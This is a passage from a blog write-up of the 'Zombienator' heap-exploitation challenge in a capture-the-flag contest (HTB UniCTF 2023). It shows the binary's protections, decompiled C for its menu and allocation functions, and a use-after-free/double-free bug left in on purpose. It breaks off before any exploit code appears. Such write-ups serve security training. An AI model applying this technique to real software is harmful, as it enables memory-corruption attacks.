<!doctype html><html lang="en"><head><title>Zombienator | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="HTB UniCTF 2023. 64-bit binary. Heap exploitation. Buffer Overflow. Floating point numbers. Canary bypass. Ret2Libc. Oracle"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB UniCTF 2023. 64-bit binary. Heap exploitation. Buffer Overflow. Floating point numbers. Canary bypass. Ret2Libc. Oracle"><meta itemprop="keywords" content><meta itemprop="name" content="Zombienator"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="HTB UniCTF 2023. 64-bit binary. Heap exploitation. Buffer Overflow. Floating point numbers. Canary bypass. Ret2Libc. Oracle"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Zombienator"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="HTB UniCTF 2023. 64-bit binary. Heap exploitation. Buffer Overflow. Floating point numbers. Canary bypass. Ret2Libc. Oracle"><meta name="twitter:description" content="HTB UniCTF 2023. 64-bit binary. Heap exploitation. Buffer Overflow. Floating point numbers. Canary bypass. Ret2Libc. Oracle"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Zombienator"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><script>alert("Buy me a beer plz")</script><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/htb-unictf/zombienator/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB UNICTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/&amp;text=Zombienator" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/&amp;title=Zombienator" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Zombienator</h1><p class="mb4 f6 dib tracked">10 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#show-function">Show function</a></li><li><a href="#attack-function">Attack function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li><li><a href="#flag-exfiltration">Flag exfiltration</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>zombienator</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>If we open the binary in Ghidra, we will see this decompiled C source code for the <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  ulong option;</span>

<span class="mtk1">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">##########################</span><span class="mtk6">\n</span><span class="mtk4">#                        #</span><span class="mtk6">\n</span><span class="mtk4"># 1. Create  Zombienator #</span><span class="mtk10">\ </span><span class="mtk4">n# 2. Remove  Zombienator #</span><span class="mtk6">\n</span><span class="mtk4"># 3. Display Zombienator #</span><span class="mtk6">\n</span><span class="mtk4"># 4. Attack              #</span><span class="mtk6">\n</span><span class="mtk4">#  5. Exit                #</span><span class="mtk6">\n</span><span class="mtk4">#                        #</span><span class="mtk6">\n</span><span class="mtk4">##########################</span><span class="mtk6">\n\n</span><span class="mtk4">&gt; &gt; "</span><span class="mtk1">);</span>  
<span class="mtk1">        option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_num</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">        </span><span class="mtk8">attack</span><span class="mtk1">();</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">4</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> option) </span><span class="mtk5">goto</span><span class="mtk1"> LAB_00101a2a;</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">      </span><span class="mtk8">display</span><span class="mtk1">();</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> option) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">create</span><span class="mtk1">();</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">      </span><span class="mtk8">removez</span><span class="mtk1">();</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>

<span class="mtk1">LAB_00101a2a:</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Good luck!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>
<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">520</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>What we have is a typical menu from a heap exploitation challenge:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./zombienator</span>

<span class="code-cyan">⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠊⠉⠉⠉⠉⢉⠝⠉⠓⠦⣄</span>
<span class="code-cyan">⠀⠀⠀⠀⠀⠀⢀⡴⣋⠀⠀⣤⣒⡠⢀⠀⠐⠂⠀⠤⠤⠈⠓⢦⡀</span>
<span class="code-cyan">⠀⠀⠀⠀⠀⣰⢋⢬⠀⡄⣀⠤⠄⠀⠓⢧⠐⠥⢃⣴⠤⣤⠀⢀⡙⣆</span>
<span class="code-cyan">⠀⠀⠀⠀⢠⡣⢨⠁⡘⠉⠀⢀⣤⡀⠀⢸⠀⢀⡏⠑⠢⣈⠦⠃⠦⡘⡆</span>
<span class="code-cyan">⠀⠀⠀⠀⢸⡠⠊⠀⣇⠀⠀⢿⣿⠇⠀⡼⠀⢸⡀⠠⣶⡎⠳⣸⡠⠃⡇</span>
<span class="code-cyan">⢀⠔⠒⠢⢜⡆⡆⠀⢿⢦⣤⠖⠒⢂⣽⢁⢀⠸⣿⣦⡀⢀⡼⠁⠀⠀⡇⠒⠑⡆</span>  
<span class="code-cyan">⡇⠀⠐⠰⢦⠱⡤⠀⠈⠑⠪⢭⠩⠕⢁⣾⢸⣧⠙⡯⣿⠏⠠⡌⠁⡼⢣⠁⡜⠁</span>
<span class="code-cyan">⠈⠉⠻⡜⠚⢀⡏⠢⢆⠀⠀⢠⡆⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⣼⠾⢬⣹⡾</span>
<span class="code-cyan">⠀⠀⠀⠉⠀⠉⠀⠀⠈⣇⠀⠀⠀⣴⡟⢣⣀⡔⡭⣳⡈⠃⣼⠀⠀⠀⣼⣧</span>
<span class="code-cyan">⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⣸⣿⣿⣿⡿⣷⣿⣿⣷⠀⡇⠀⠀⠀⠙⠊</span>
<span class="code-cyan">⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣠⠀⢻⠛⠭⢏⣑⣛⣙⣛⠏⠀⡇</span>
<span class="code-cyan">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠠⠜⠓⠉⠉⠀⠐⢒⡒⡍⠐⡇</span>
<span class="code-cyan">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠢⠤⣀⣀⣀⣀⣘⠧⠤⠞⠁</span>


<span class="code-blue">     +--------------------+</span>
<span class="code-blue">     | Threat Level: <span class="code-red">HIGH<span class="code-blue"> |</span>
<span class="code-blue">     +--------------------+</span>


<span class="code-blue">##########################</span>
<span class="code-blue">#                        #</span>
<span class="code-blue"># 1. Create  Zombienator #</span>
<span class="code-blue"># 2. Remove  Zombienator #</span>
<span class="code-blue"># 3. Display Zombienator #</span>
<span class="code-blue"># 4. Attack              #</span>
<span class="code-blue"># 5. Exit                #</span>
<span class="code-blue">#                        #</span>
<span class="code-blue">##########################</span>

<span class="code-blue">&gt;&gt;</span>
</code></pre></div><p>We can create, remove and display <em>zombienators</em>. Additionally, we can attack.</p><h3 id="allocation-function">Allocation function</h3><p>In <code>create</code>:</p><ul><li>We can allocate a <em>zombienator</em> with up to <code>0x82</code> bytes</li><li>We can determine its position in the array</li><li>The maximum number of <em>zombienators</em> is <code>10</code></li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">() {</span>
<span class="mtk1">  undefined8 </span><span class="mtk5">*</span><span class="mtk1">puVar1;</span>
<span class="mtk1">  ulong size;</span>
<span class="mtk1">  ulong line;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_zombie;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Zombienator</span><span class="mtk6">\'</span><span class="mtk4">s tier: "</span><span class="mtk1">);</span>
<span class="mtk1">  size </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_num</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((size </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">83</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (size </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)) {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Front line (0-4) or Back line (5-9): "</span><span class="mtk1">);</span>
<span class="mtk1">    line </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_num</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (line </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1">) {</span>
<span class="mtk1">      p_zombie </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">malloc</span><span class="mtk1">(size);</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (z </span><span class="mtk5">+</span><span class="mtk1"> line </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> p_zombie;</span>
<span class="mtk1">      puVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">**</span><span class="mtk1">) (z </span><span class="mtk5">+</span><span class="mtk1"> line </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">puVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">616e6569626d6f5a</span><span class="mtk1">;</span>
<span class="mtk1">      puVar1[</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">6461657220726f74</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(undefined2 </span><span class="mtk5">*</span><span class="mtk1">) (puVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2179</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(undefined </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) puVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">12</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n%s</span><span class="mtk4">[+] Zombienator created!</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0010203f, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00102008);</span>  
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"[-] Invalid position!"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"[-] Cannot create Zombienator for this tier!"</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)(in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="free-function">Free function</h3><p>In <code>removez</code> we have one issue, which is that the <em>zombienator</em> slot is not set to <code>NULL</code> after it is freed. As a result, we have a potential Use After Free or even a Double Free vulnerability:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">removez</span><span class="mtk1">() {</span>
<span class="mtk1">  ulong index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Zombienator</span><span class="mtk6">\'</span><span class="mtk4">s position: "</span><span class="mtk1">);</span>
<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_num</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (z </span><span class="mtk5">+</span><span class="mtk1"> index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
